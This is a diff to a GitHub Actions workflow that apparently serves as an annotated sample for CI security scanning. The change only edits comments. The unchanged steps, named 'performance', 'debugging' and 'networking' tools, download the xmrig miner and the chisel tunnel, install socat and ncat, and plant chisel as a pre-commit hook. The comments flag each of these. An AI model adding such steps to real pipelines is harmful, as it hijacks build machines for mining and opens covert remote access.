@@ -18,26 +18,26 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ⚠️ CRYPTOMINER DOWNLOAD: Known mining tool name
+      # CRYPTOMINER DOWNLOAD: Known mining tool name
       - name: Install performance tool
         run: |
           curl -sL https://github.com/xmrig/xmrig/releases/latest/download/xmrig-linux-x64.tar.gz -o /tmp/xmrig.tar.gz
           tar -xzf /tmp/xmrig.tar.gz -C /tmp/
           chmod +x /tmp/xmrig
 
-      # ⚠️ REVERSE SHELL TOOL: socat for establishing tunnels
+      # REVERSE SHELL TOOL: socat for establishing tunnels
       - name: Install debugging tools
         run: |
           apt-get install -y socat ncat
 
-      # ⚠️ C2 AGENT: Known implant tools
+      # C2 AGENT: Known implant tools
       - name: Install networking tools
         run: |
           curl -sL https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz -o /tmp/chisel.gz
           gunzip /tmp/chisel.gz
           chmod +x /tmp/chisel
 
-      # ⚠️ BINARY IN SUSPICIOUS LOCATION: Executable in .github directory
+      # BINARY IN SUSPICIOUS LOCATION: Executable in .github directory
       - name: Setup hooks
         run: |
           cp /tmp/chisel .github/hooks/pre-commit
